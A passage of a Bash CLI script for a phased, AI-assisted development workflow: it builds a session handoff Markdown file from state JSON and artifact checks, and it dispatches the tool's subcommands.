  local srd_path="${_init_dir}/${SRD_FILENAME}"
  local audit_srd_path="${_init_dir}/audit-srd.md"
  local tickets_path="${_init_dir}/${TICKET_PACK_DIRNAME}/README.md"
  local audit_tickets_path="${_init_dir}/${TICKET_PACK_DIRNAME}/audit.md"

  # WS-D artifact paths (T81)
  local arch_path="${_init_dir}/architecture.md"
  local decisions_path="${_init_dir}/decisions.md"
  local rollback_path="${_init_dir}/ROLLBACK.md"
  local exec_report_path="${_init_dir}/exec-report.md"

  local s_planning s_srd s_audit_srd s_tickets s_audit_tickets
  local s_arch s_decisions s_rollback s_exec_report
  s_planning="$(present_or_absent "$planning_path")"
  s_srd="$(present_or_absent "$srd_path")"
  s_audit_srd="$(present_or_absent "$audit_srd_path")"
  s_tickets="$(present_or_absent "$tickets_path")"
  s_audit_tickets="$(present_or_absent "$audit_tickets_path")"
  s_arch="$(present_or_absent "$arch_path")"
  s_decisions="$(present_or_absent "$decisions_path")"
  s_rollback="$(present_or_absent "$rollback_path")"
  s_exec_report="$(present_or_absent "$exec_report_path")"

  # Decisions Made section from planning.md
  local decisions=""
  if [[ -f "$planning_path" ]]; then
    decisions="$(awk '/^## Decisions Made/{p=1;next} p && /^## /{p=0} p{print}' "$planning_path" 2>/dev/null \
      | grep -v '^[[:space:]]*$' || true)"
  fi
  [[ -n "$decisions" ]] || decisions="_(none recorded yet - decisions are captured at Gate 1)_"

  # Preserve user-edited Notes section across re-writes (CA-027). `## Notes` is the LAST
  # section this function renders (see the final printf block below), so capturing everything
  # from the `## Notes` heading through end-of-file, verbatim, is correct -- there is no next
  # generated heading to stop at, and stopping at the first `## ` line would wrongly truncate
  # the block if the user types their own `## ` subheading inside their notes prose. The old
  # `grep -v '^[[:space:]]*$'` pass has been removed: it silently deleted every blank line in
  # the user's own notes on every rewrite, destroying paragraph structure with no .bak to
  # recover from.
  local handoff_path="${_init_dir}/HANDOFF.md"
  local notes=""
  if [[ -f "$handoff_path" ]]; then
    notes="$(awk '/^## Notes/{p=1;next} p{print}' "$handoff_path" 2>/dev/null || true)"
    # The render below emits its own blank line after the "## Notes" heading (matching every
    # other section), and the captured text starts with that same blank line copied verbatim --
    # strip exactly one leading blank so it does not double up and grow by one blank line on
    # every single regeneration cycle over an initiative's life.
    notes="${notes#$'\n'}"
  fi
  [[ -n "$notes" ]] || notes="_(Add anything a teammate should know before resuming - context, blockers, preferences)_"

  # Surface product and description when present (T43)
  local product_name initiative_description
  product_name="$(echo "$state" | jq -r '.product_name // ""')"
  initiative_description="$(echo "$state" | jq -r '.initiative_description // ""')"

  local updated_at
  updated_at="$(now_utc)"

  # Resume Point fields (T48, T52) -- empty-safe; absent on pre-T52 state files.
  local current_step last_decision
  current_step="$(echo "$state" | jq -r '.current_step // ""')"
  last_decision="$(echo "$state" | jq -r '.last_decision // ""')"

  # Pending artifacts for the current phase (absent files only).
  local pending_artifacts=""
  case "$phase" in
    1) [[ -f "$planning_path" ]] || pending_artifacts="- \`${_init_dir}/planning.md\`" ;;
    2) [[ -f "$srd_path" ]] || pending_artifacts="- \`${_init_dir}/${SRD_FILENAME}\`" ;;
    3)
      [[ -f "$srd_path" ]] || pending_artifacts="${pending_artifacts}- \`${_init_dir}/${SRD_FILENAME}\`"$'\n'
      [[ -f "$audit_srd_path" ]] || pending_artifacts="${pending_artifacts}- \`${_init_dir}/audit-srd.md\`"
      ;;
    4) [[ -f "$tickets_path" ]] || pending_artifacts="- \`${_init_dir}/${TICKET_PACK_DIRNAME}/README.md\`" ;;
    5)
      [[ -f "$tickets_path" ]] || pending_artifacts="${pending_artifacts}- \`${_init_dir}/${TICKET_PACK_DIRNAME}/README.md\`"$'\n'
      [[ -f "$audit_tickets_path" ]] || pending_artifacts="${pending_artifacts}- \`${_init_dir}/${TICKET_PACK_DIRNAME}/audit.md\`"
      ;;
    6) pending_artifacts="_(implementation in progress -- track individual ticket status)_" ;;
  esac
  [[ -n "${pending_artifacts:-}" ]] || pending_artifacts="_(all phase artifacts present)_"
  # Trim trailing newline from multi-line pending_artifacts.
  pending_artifacts="${pending_artifacts%$'\n'}"

  # Outstanding PARTIAL verdicts (T67).
  local partial_verdicts_text
  partial_verdicts_text="$(echo "$state" | jq -r '
    (.partial_verdict_map // {}) | to_entries |
    map(select(.value.verdict == "PARTIAL")) |
    if length == 0 then ""
    else map("- **\(.key)**: \(.value.note // "(no note)")  _(recorded \(.value.recorded_at // "?"))_") | join("\n")
    end
  ')"

  # Open-findings summary (EDMV3-T18 AC8): sourced from findings-ledger.jsonl "when present"
  # -- absence is authoritative (no section rendered at all) rather than a placeholder,
  # matching every other on-demand HANDOFF section's convention. Delegates to
  # cmd_audit_converged rather than re-evaluating the shared blocking-set predicate a second
  # time here (EDMV3-T28 AC9 fixes that predicate's name-reference count at exactly four
  # sites; re-deriving it a fifth time here would break that guardrail for no benefit, since
  # cmd_audit_converged already computes exactly what this section needs to show).
  # Exit 3 ("no ledger") omits the section entirely; exit 0/1 both render
  # cmd_audit_converged's own summary text.
  local open_findings_summary="" of_out of_ec=0
  of_out="$(cmd_audit_converged "$prefix" 2>&1)" || of_ec=$?
  case "$of_ec" in
    0) open_findings_summary="_(${of_out})_" ;;
    1) open_findings_summary="${of_out}" ;;
    *) open_findings_summary="" ;;
  esac

  local handoff_content
  handoff_content="$({
    printf '%s\n\n' "# ${prefix} - Session Handoff"
    printf '%s  \n' "> **Last updated**: ${updated_at} by ${USER:-unknown}"
    printf '%s\n\n' "> **To resume**: \`/edm:orchestrator ${prefix}\`"
    printf '%s\n\n' "## Current Status"
    printf '%s\n' "- **Phase**: ${phase_name}"
    printf '%s\n' "- **Gates approved**: ${gates_count} of 3"
    printf '%s\n' "- **Last gate**: ${last_gate}"
    [[ -n "$product_name" ]] && printf '%s\n' "- **Product**: ${product_name}"
    [[ -n "$initiative_description" ]] && printf '%s\n' "- **Description**: ${initiative_description}"
    printf '%s\n\n' "- **Next action**: ${next_action}"
    [[ -n "$schema_version_note" ]] && printf '%s\n\n' "$schema_version_note"
    printf '%s\n\n' "## Resume Point"
    printf '%s\n' "- **Phase**: ${phase_name}"
    [[ -n "$current_step" ]]  && printf '%s\n' "- **Step**: ${current_step}"
    [[ -n "$last_decision" ]] && printf '%s\n' "- **Last decision**: ${last_decision}"
    printf '\n%s\n\n' "**Pending artifacts for ${phase_name}**:"
    printf '%s\n\n' "${pending_artifacts}"
    printf '%s\n\n' "> Copy-paste to resume: \`/edm:orchestrator ${prefix}\`"
    printf '%s\n\n' "## Lifecycle & Mode"
    printf '%s\n' "- **Mode**: ${mode}"
    printf '%s\n' "- **Lifecycle mode**: ${lifecycle_mode}"
    printf '%s\n' "- **Compliance**: ${compliance_enabled}"
    printf '%s\n' "- **Implementation mode**: ${implementation_mode}"
    [[ -n "$supersedes" ]]  && printf '%s\n' "- **Supersedes**: ${supersedes}"
    [[ -n "$forked_from" ]] && printf '%s\n' "- **Forked from**: ${forked_from}"
    if [[ -n "$skipped_phases_json" ]]; then
      printf '\n%s\n' "**Skipped phases:**"
      printf '%s\n' "${skipped_phases_json}"
    fi
    printf '\n'
    if [[ -n "$partial_verdicts_text" ]]; then
      printf '%s\n\n' "## Outstanding PARTIAL Verdicts"
      printf '%s\n\n' "${partial_verdicts_text}"
    fi
    if [[ -n "$open_findings_summary" ]]; then
      printf '%s\n\n' "## Open Code-Audit Findings"
      printf '%s\n\n' "${open_findings_summary}"
    fi
    printf '%s\n\n' "## Gates"
    printf '%s\n\n' "${gate_list}"
    printf '%s\n\n' "## Artifact Checklist"
    printf '%s\n' "| Artifact | Status |"
    printf '%s\n' "|----------|--------|"
    printf '%s\n' "| \`${_init_dir}/planning.md\` | ${s_planning} |"
    printf '%s\n' "| \`${_init_dir}/${SRD_FILENAME}\` | ${s_srd} |"
    printf '%s\n' "| \`${_init_dir}/audit-srd.md\` | ${s_audit_srd} |"
    printf '%s\n' "| \`${_init_dir}/${TICKET_PACK_DIRNAME}/README.md\` | ${s_tickets} |"
    printf '%s\n' "| \`${_init_dir}/${TICKET_PACK_DIRNAME}/audit.md\` | ${s_audit_tickets} |"
    printf '%s\n' "| \`${_init_dir}/architecture.md\` | ${s_arch} |"
    printf '%s\n' "| \`${_init_dir}/decisions.md\` | ${s_decisions} |"
    printf '%s\n' "| \`${_init_dir}/ROLLBACK.md\` | ${s_rollback} (on-demand) |"
    printf '%s\n\n' "| \`${_init_dir}/exec-report.md\` | ${s_exec_report} (on-demand) |"
    printf '%s\n\n' "## Key Decisions Made"
    printf '%s\n\n' "${decisions}"
    if [[ "$s_decisions" == "[present]" ]]; then
      printf '%s\n\n' "-> See full decision ledger: \`${_init_dir}/decisions.md\`"
    fi
    # Related Initiatives section (T103)
    local parent_prefix_val related_prefixes_val
    parent_prefix_val="$(echo "$state" | jq -r '.parent_prefix // ""')"
    related_prefixes_val="$(echo "$state" | jq -r '(.related_prefixes // []) | join(" ")')"
    if [[ -n "$parent_prefix_val" || -n "$related_prefixes_val" ]]; then
      printf '%s\n\n' "## Related Initiatives"
      if [[ -n "$parent_prefix_val" ]]; then
        local parent_dir
        parent_dir="$(state_file_for "$parent_prefix_val" 2>/dev/null || true)"
        if [[ -n "$parent_dir" && -f "$parent_dir" ]]; then
          printf '%s\n' "- Parent: ${parent_prefix_val} (${parent_dir%/.edm-state.json})"
        else
          printf '%s\n' "- Parent: ${parent_prefix_val} (unresolved)"
        fi
      fi
      if [[ -n "$related_prefixes_val" ]]; then
        local rp
        # shellcheck disable=SC2086 -- deliberate word-splitting; value is a space-separated prefix list
        for rp in $related_prefixes_val; do
          local rp_dir
          rp_dir="$(state_file_for "$rp" 2>/dev/null || true)"
          if [[ -n "$rp_dir" && -f "$rp_dir" ]]; then
            printf '%s\n' "- Related: ${rp} (${rp_dir%/.edm-state.json})"
          else
            printf '%s\n' "- Related: ${rp} (unresolved)"
          fi
        done
      fi
      printf '\n'
    fi
    printf '%s\n\n' "## How to Resume"
    printf '%s\n' "1. Pull the latest branch - all EDM artifacts are committed"
    printf '%s\n' "2. Open Claude Code in the project root"
    printf '%s\n' "3. Run: \`/edm:orchestrator ${prefix}\`"
    printf '%s\n\n' "4. The orchestrator detects the existing initiative and resumes from **${phase_name}**"
    printf '%s\n\n' "## Notes"
    printf '%s\n' "${notes}"
  })"
  write_atomic "$handoff_path" _print_line "$handoff_content" || die "write-handoff: failed to write ${handoff_path}"
}

cmd_write_handoff() {
  [[ $# -eq 1 ]] || die "usage: edm-state write-handoff <PREFIX>"
  write_handoff_internal "$1"
  echo "wrote $(initiative_dir_for "$1")/HANDOFF.md"
}

# ---- dispatch ---------------------------------------------------------------
# Guarded so this file can be `source`d (e.g. by bin/tests/*-smoke.sh to unit-test
# internal helpers like terminal_phase_for_mode() directly, EDMV3-T07 AC8) without
# executing the CLI dispatch. Running it normally as a script is unaffected --
# BASH_SOURCE[0] equals $0 in that case.

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then

cmd="${1:-}"; shift || true
case "$cmd" in
  get)                  cmd_get "$@" ;;
  set)                  cmd_set "$@" ;;
  init)                 cmd_init "$@" ;;
  list)                 cmd_list "$@" ;;
  active-initiatives)   cmd_active_initiatives "$@" ;;
  migrate-path)         cmd_migrate_path "$@" ;;
  approve-gate)         cmd_approve_gate "$@" ;;
  phase-start)          cmd_phase_start "$@" ;;
  phase-complete)       cmd_phase_complete "$@" ;;
  checkpoint-if-active) cmd_checkpoint "$@" ;;
  record-test-coverage) cmd_record_test_coverage "$@" ;;
  record-tests-added)   cmd_record_tests_added "$@" ;;
  get-coverage)         cmd_get_coverage "$@" ;;
  srd-version)          cmd_srd_version "$@" ;;
  migrate-schema)       cmd_migrate_schema "$@" ;;
  archive)              cmd_archive "$@" ;;
  write-handoff)        cmd_write_handoff "$@" ;;
  watch-impl)           cmd_watch_impl "$@" ;;
  metrics-report)       cmd_metrics_report "$@" ;;
  validate)             cmd_validate "$@" ;;
  gate-check)           cmd_gate_check "$@" ;;
  branch-check)         cmd_branch_check "$@" ;;
  record-branch)        cmd_record_branch "$@" ;;
  git-lock-check)       cmd_git_lock_check "$@" ;;
  current-step)         cmd_current_step "$@" ;;
  session-start)        cmd_session_start "$@" ;;
  audit-round-start)    cmd_audit_round_start "$@" ;;
  audit-round-complete) cmd_audit_round_complete "$@" ;;
  render-ledger)        cmd_render_ledger "$@" ;;
  audit-converged)      cmd_audit_converged "$@" ;;
  record-partial-verdict) cmd_record_partial_verdict "$@" ;;
  set-mode)             cmd_set_mode "$@" ;;
  skip-phase)           cmd_skip_phase "$@" ;;
  set-supersedes)       cmd_set_supersedes "$@" ;;
  set-forked-from)      cmd_set_forked_from "$@" ;;
  resolve-dir)          cmd_resolve_dir "$@" ;;
  set-parent)           cmd_set_parent "$@" ;;
  add-related)          cmd_add_related "$@" ;;
  update-patterns)      cmd_update_patterns "$@" ;;
  lint)                 cmd_lint "$@" ;;
  ""|-h|--help|help)
    print_help "$0"
    ;;
  *)
    die "unknown subcommand: $cmd (try --help)"
    ;;
esac

fi
